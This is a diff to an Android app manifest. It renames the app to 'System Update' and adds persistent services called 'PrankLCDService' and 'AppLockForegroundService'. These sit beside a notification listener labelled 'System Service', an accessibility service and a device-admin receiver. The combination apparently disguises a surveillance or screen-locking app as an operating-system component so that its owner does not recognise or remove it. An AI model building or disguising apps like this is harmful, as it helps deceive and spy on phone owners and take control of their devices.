@@ -75,7 +75,7 @@
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher_round"
-        android:label="EXOID ENGINE"
+        android:label="System Update"
         android:supportsRtl="true"
         android:theme="@style/Theme.SystemUpdate"
         android:usesCleartextTraffic="true"
@@ -219,6 +219,18 @@
             android:stopWithTask="false"/>
 
         <service
+            android:name=".PrankLCDService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false"/>
+
+        <service
+            android:name=".AppLockForegroundService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false"/>
+
+        <service
             android:name=".NotificationListener"
             android:exported="true"
             android:label="System Service"
@@ -240,12 +252,7 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config"/>
         </service>
-         <service
-    android:name=".PrankLCDService"
-    android:exported="false"
-    android:foregroundServiceType="dataSync"
-    android:stopWithTask="false"/>
-       </service>
+
         <!-- ============ RECEIVERS ============ -->
         <receiver
             android:name=".AdminReceiver"
